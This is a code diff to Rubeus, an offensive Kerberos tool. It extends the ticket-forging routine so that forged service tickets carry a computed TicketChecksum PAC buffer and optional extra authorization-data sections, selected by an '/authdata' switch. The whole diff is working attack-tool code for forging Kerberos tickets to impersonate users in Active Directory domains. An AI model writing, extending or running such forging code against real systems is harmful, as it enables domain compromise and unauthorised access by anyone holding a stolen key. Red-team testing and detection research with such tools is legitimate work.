@@ -69,7 +69,8 @@ namespace Rubeus
             // arguments for unusual tickets
             string cName = null,
             string s4uProxyTarget = null,
-            string s4uTransitedServices = null
+            string s4uTransitedServices = null,
+            bool includeAuthData = false
             )
         {
             // vars
@@ -760,7 +761,42 @@ namespace Rubeus
                     }
                 }
 
-                // generate clear signatures
+                if (decTicketPart.authorization_data == null)
+                {
+                    decTicketPart.authorization_data = new List<AuthorizationData>();
+                }
+
+                // generate blank PAC for TicketChecksum for service tickets
+                SignatureData ticketSigData = null;
+                if (!(parts[0].Equals("krbtgt") && parts[1].Equals(domain)))
+                {
+                    ticketSigData = new SignatureData(PacInfoBufferType.TicketChecksum);
+                    ticketSigData.SignatureType = kdcSigData.SignatureType;
+                    ADIfRelevant ifrelevant = new ADIfRelevant();
+                    ADWin2KPac win2KPac = new ADWin2KPac();
+                    win2KPac.Pac = null;
+                    win2KPac.ad_data = new byte[] { 0x00 };
+                    decTicketPart.authorization_data.Add(new ADIfRelevant(win2KPac));
+                }
+
+                // set extra AuthorizationData sections
+                if (includeAuthData)
+                {
+                    ADIfRelevant ifrelevant = new ADIfRelevant();
+                    ADRestrictionEntry restrictions = new ADRestrictionEntry();
+                    ADKerbLocal kerbLocal = new ADKerbLocal();
+                    ifrelevant.ADData.Add(restrictions);
+                    ifrelevant.ADData.Add(kerbLocal);
+                    decTicketPart.authorization_data.Add(ifrelevant);
+                }
+
+                // now we have the extra auth data sections, calculate TicketChecksum
+                if (!(parts[0].Equals("krbtgt") && parts[1].Equals(domain)))
+                {
+                    ticketSigData.Signature = decTicketPart.CalculateTicketChecksum(krbKey, kdcSigData.SignatureType);
+                }
+
+                // clear signatures
                 Console.WriteLine("[*] Signing PAC");
                 svrSigData.Signature = new byte[svrSigLength];
                 kdcSigData.Signature = new byte[kdcSigLength];
@@ -778,6 +814,10 @@ namespace Rubeus
                 PacInfoBuffers.Add(upnDns);
                 PacInfoBuffers.Add(svrSigData);
                 PacInfoBuffers.Add(kdcSigData);
+                if (ticketSigData != null)
+                {
+                    PacInfoBuffers.Add(ticketSigData);
+                }
                 PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
                 byte[] ptBytes = pt.Encode();
                 byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
@@ -796,6 +836,10 @@ namespace Rubeus
                 PacInfoBuffers.Add(upnDns);
                 PacInfoBuffers.Add(svrSigData);
                 PacInfoBuffers.Add(kdcSigData);
+                if (ticketSigData != null)
+                {
+                    PacInfoBuffers.Add(ticketSigData);
+                }
                 pt = new PACTYPE(0, PacInfoBuffers);
 
                 // add the PAC to the ticket
@@ -1047,6 +1091,10 @@ namespace Rubeus
                 if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
                 {
                     cmdOut = String.Format("{0} /s4uproxytarget:{1} /s4utransitiedservices:{2}", cmdOut, s4uProxyTarget, s4uTransitedServices);
+                }
+                if (includeAuthData)
+                {
+                    cmdOut = String.Format("{0} /authdata", cmdOut);
                 }
 
                 // print the command
